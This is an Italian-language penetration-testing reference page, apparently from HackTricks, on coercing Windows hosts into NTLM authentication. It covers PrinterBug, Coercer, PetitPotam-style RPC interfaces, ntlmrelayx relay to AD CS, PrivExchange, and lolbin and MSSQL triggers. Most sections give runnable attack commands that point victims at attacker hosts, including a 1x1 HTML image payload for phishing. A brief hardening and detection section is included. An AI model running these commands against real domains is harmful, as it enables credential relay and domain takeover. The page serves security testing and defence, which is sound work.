# Forzare l'autenticazione NTLM privilegiata

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) è una **raccolta** di **trigger di autenticazione remota** scritti in C# usando il compilatore MIDL per evitare dipendenze di terze parti.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato,** puoi usare credenziali AD già note per **richiedere** al print server del Domain Controller un **aggiornamento** sui nuovi processi di stampa e indicargli semplicemente di **inviare la notifica a un sistema**.\
Nota: quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi presso** quel **sistema**. Di conseguenza, un attaccante può fare in modo che il servizio _**Print Spooler**_ si autentichi presso un sistema arbitrario, e il servizio **userà l'account computer** per l'autenticazione.

Dietro le quinte, la primitiva classica **PrinterBug** abusa di **`RpcRemoteFindFirstPrinterChangeNotificationEx`** su **`\\PIPE\\spoolss`**. L'attaccante apre innanzitutto un handle della stampante/server, quindi fornisce un nome client fittizio in `pszLocalMachine`, in modo che lo spooler di destinazione crei un canale di notifica **verso l'host controllato dall'attaccante**. Per questo l'effetto è una **forzatura dell'autenticazione in uscita**, non l'esecuzione diretta di codice.<sup>[[2]](#references)</sup>\
Se cerchi **RCE/LPE** nello spooler stesso, consulta [PrintNightmare](printnightmare.md). Questa pagina si concentra sulla **coercion e sul relay**.

### Individuare i server Windows nel dominio

Usa PowerShell per elencare gli host Windows. I server sono di solito gli obiettivi prioritari, quindi concentrati prima su di essi:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Individuare i servizi Spooler in ascolto

Usando una versione leggermente modificata di [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) di @mysmartlogin (Vincent Le Toux), verifica se il servizio Spooler è in ascolto:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Puoi anche usare `rpcdump.py` su Linux e cercare il protocollo **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Oppure testare rapidamente gli host da Linux con **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Se vuoi **enumerare le superfici di coercizione** invece di limitarti a verificare se l'endpoint dello spooler esiste, usa **Coercer scan mode**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Questo è utile perché vedere l'endpoint in EPM indica solo che l'interfaccia RPC di stampa è registrata. **Non** garantisce che ogni metodo di coercion sia raggiungibile con i privilegi attuali o che l'host generi un flusso di autenticazione utilizzabile.

### Chiedi al servizio di autenticarsi con un host arbitrario

Puoi compilare [SpoolSample dal repository originale](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

oppure usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se usi Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Con **Coercer**, puoi prendere di mira direttamente le interfacce dello spooler ed evitare di indovinare quale metodo RPC è esposto:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Callback moderni RPC-over-TCP

Non dare per scontato che una chiamata `RpcRemoteFindFirstPrinterChangeNotificationEx` riuscita debba generare traffico su TCP/445. **Windows 11 22H2 e versioni successive usano RPC over TCP per le comunicazioni di stampa per impostazione predefinita**; RPC over named pipes è disabilitato, a meno che non venga ripristinato tramite criteri o impostando `RpcUseNamedPipeProtocol=1`. Di conseguenza, i listener legacy solo SMB possono segnalare che il trigger è stato inviato senza mai ricevere il callback. Microsoft documenta TCP/135 (Endpoint Mapper) più porte RPC dinamiche per il normale RPC di stampa; le organizzazioni possono limitare questo intervallo o selezionare una porta RPC di stampa fissa.<sup>[[10]](#references)</sup>

L'attuale **Impacket `ntlmrelayx.py`** include un RPC relay server e un Endpoint Mapper minimale, abilitato per impostazione predefinita su TCP/135. Questo supporto è stato integrato a giugno 2025, specificamente con una catena PrinterBug-to-AD-CS dimostrata, consentendo il relay del callback RPC autenticato anche quando la vittima non passa a SMB/WebDAV.<sup>[[11]](#references)</sup>

Il supporto RPC relay/EPM è incluso in **Impacket 0.13.0 e versioni successive**. Prima di indagare su un listener TCP/135 assente, verifica che non venga eseguito un `ntlmrelayx.py` incluso in un pacchetto meno recente; l'output della guida dovrebbe mostrare entrambe le opzioni del server RPC.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Cerca `Setting up RPC Server on port 135` e `RPCD: Received connection` nell’output di relay. Se la chiamata RPC restituisce un errore previsto ma il listener non riceve nulla, controlla la print RPC transport policy della vittima, il filtraggio in uscita, la risoluzione DNS e se un altro processo ha già preso possesso di TCP/135. Verifica anche che `ntlmrelayx` non sia stato avviato con `--no-rpc-server`.

### Forzare HTTP invece di SMB con WebClient

Sui sistemi che usano ancora **RPC over named pipes** (build legacy o comportamento ripristinato tramite policy), il PrinterBug classico di solito produce un’autenticazione **SMB** verso `\\attacker\share`, utile comunque per **capture**, **relay verso target HTTP** o **relay quando SMB signing è assente**.\
Tuttavia, il relay da **SMB a SMB** è spesso bloccato da **SMB signing**, quindi gli operatori potrebbero preferire forzare invece l’autenticazione **HTTP/WebDAV**. Questa non è una soluzione alternativa al comportamento RPC-over-TCP descritto sopra.

Se il servizio **WebClient** è in esecuzione sul target, il listener può essere specificato in un formato che fa usare a Windows **WebDAV over HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Questo è particolarmente utile quando si combina con **`ntlmrelayx --adcs`** o altri target di HTTP relay, perché evita di dipendere dalla possibilità di effettuare SMB relay sulla connessione forzata. L'avvertenza importante è che **WebClient deve essere in esecuzione** sulla vittima affinché la variante HTTP/WebDAV funzioni.

### Combinazione con Unconstrained Delegation

Se un attaccante ha compromesso un computer configurato per [Unconstrained Delegation](unconstrained-delegation.md), può **forzare la stampante ad autenticarsi su quel computer**. Il **TGT** dell'account del computer della stampante viene quindi memorizzato nella cache in memoria sull'host con Unconstrained Delegation, dove l'attaccante può recuperarlo e riutilizzarlo con [Pass the Ticket](pass-the-ticket.md).

### Note su rilevamento e hardening

Il metodo più affidabile per rimuovere PrinterBug da un DC, PAW o server che non stampa è arrestare e disabilitare lo Spooler. Se la stampa è necessaria, proteggi ogni possibile destinazione del relay (firma SMB del server, firma LDAP/channel binding ed EPA sui servizi HTTP come AD CS) invece di presumere che bloccare TCP/445 sul percorso di callback sia sufficiente.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Se l'host ha ancora bisogno della **stampa locale**, un controllo più mirato consiste nell'impostare la GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. In questo modo si impedisce allo spooler di accettare connessioni client remote (e la condivisione delle stampanti), lasciando però il servizio disponibile localmente; dopo aver applicato l'impostazione, riavviare lo spooler e ripetere i controlli di raggiungibilità MS-RPRN sopra.<sup>[[13]](#references)</sup>

Il rilevamento dovrebbe correlare una chiamata autenticata all'UUID MS-RPRN `12345678-1234-abcd-ef00-0123456789ab`, in particolare opnum 62/65 con un valore di callback non locale, e una connessione SMB, HTTP o RPC in uscita immediatamente successiva dall'host dello spooler. Definire una baseline di **UUID/opnum dell'interfaccia e coppie sorgente/destinazione**, non limitarsi all'accesso a `\PIPE\spoolss`, poiché gli stack di stampa attuali possono effettuare il callback su RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matrice di coercizione dei percorsi UNC RPC (interfacce/opnum che innescano l'autenticazione in uscita)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - UUID IF: 12345678-1234-abcd-ef00-0123456789ab
  - Opnum: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Strumenti: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - UUID IF: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Note: interfaccia di stampa asincrona sulla stessa pipe dello spooler; usare Coercer per enumerare i metodi raggiungibili su un determinato host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipe: \\PIPE\\efsrpc (anche tramite \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - UUID IF: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnum comunemente sfruttati: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Strumento: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - UUID IF: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnum: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Strumento: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - UUID IF: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnum: 8 IsPathSupported; 9 IsPathShadowCopied
  - Strumento: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - UUID IF: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Strumento: CheeseOunce<sup>[[1]](#references)</sup>

Nota: questi metodi accettano parametri che possono contenere un percorso UNC (ad es. `\\attacker\share`). Quando li elabora, Windows esegue l'autenticazione (nel contesto dell'account macchina/utente) verso tale UNC, consentendo la cattura o il relay di NetNTLM.\
Per gli abusi dello spooler, **MS-RPRN opnum 65** resta la primitiva più comune e meglio documentata, perché la specifica del protocollo dichiara esplicitamente che il server crea un canale di notifica verso il client specificato da `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: coercizione di ElfrOpenBELW (opnum 9)
- Interfaccia: MS-EVEN su \\PIPE\\even (UUID IF 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Firma della chiamata: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effetto: il target tenta di aprire il percorso del log di backup fornito ed esegue l'autenticazione verso l'UNC controllato dall'attaccante.<sup>[[1]](#references)</sup>
- Uso pratico: indurre asset Tier 0 (DC/RODC/Citrix/ecc.) a generare NetNTLM, quindi eseguire il relay verso endpoint AD CS (scenari ESC8/ESC11) o altri servizi privilegiati.<sup>[[1]](#references)</sup>

## PrivExchange

L'attacco `PrivExchange` deriva da una vulnerabilità nella **funzionalità `PushSubscription` di Exchange Server**. Questa funzionalità consente a qualsiasi utente del dominio con una mailbox di forzare il server Exchange ad autenticarsi via HTTP verso un host fornito dal client.

Per impostazione predefinita, il **servizio Exchange viene eseguito come SYSTEM** e dispone di privilegi eccessivi (in particolare, dispone di **privilegi WriteDacl sul dominio nelle versioni precedenti al Cumulative Update 2019**). Questa vulnerabilità può essere sfruttata per consentire il **relay di informazioni verso LDAP e, successivamente, estrarre il database NTDS del dominio**. Se non è possibile eseguire il relay verso LDAP, la vulnerabilità può comunque essere usata per eseguire il relay e autenticarsi su altri host del dominio. Lo sfruttamento riuscito di questo attacco garantisce accesso immediato a Domain Admin usando un qualsiasi account utente autenticato del dominio.

## Dentro Windows

Se si è già all'interno della macchina Windows, è possibile forzare Windows a connettersi a un server usando account privilegiati con:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile usare certutil.exe lolbin (binario firmato da Microsoft) per forzare l'autenticazione NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Tramite email

Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, puoi semplicemente inviargli un'**email con un'immagine 1x1** come ad esempio

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Quando la vittima lo apre, Windows tenta di autenticarsi.

### MitM

Se puoi eseguire un attacco MitM e iniettare HTML in una pagina visualizzata dalla vittima, prova a iniettare un'immagine come:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Altri modi per forzare e indurre tramite phishing l’autenticazione NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se riesci a catturare challenge [NTLMv1, qui trovi come crackarle](../ntlm/index.html#ntlmv1-attack).\
_Ricorda che, per crackare NTLMv1, devi impostare la challenge di Responder su "1122334455667788"_



## References

- [1] [Unit 42 – La coercizione dell’autenticazione continua a evolversi](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: protocollo di accesso remoto al registro eventi](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – metodi di autenticazione forzata di Windows](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – aggiornamenti delle connessioni RPC per la stampa in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – server di relay RPC e Endpoint Mapper per ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0: rilascio](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: consentire a Print Spooler di accettare connessioni client](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
